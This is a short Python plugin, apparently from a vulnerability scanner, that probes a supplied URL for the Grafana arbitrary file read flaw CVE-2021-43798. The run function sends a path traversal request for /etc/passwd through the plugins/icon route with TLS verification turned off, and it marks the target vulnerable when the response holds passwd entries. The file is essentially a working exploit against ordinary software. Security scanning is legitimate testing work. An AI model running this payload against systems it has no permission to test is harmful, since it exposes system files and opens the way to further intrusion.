#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {}
  ret['links'] = ['https://blog.csdn.net/MrHatSec/article/details/123523216']
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "Grafana任意文件读取CVE-2021-43798"
  ret['level'] = "medium"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret
  
def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = '/public/plugins/icon/../../../../../../../../etc/passwd'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret
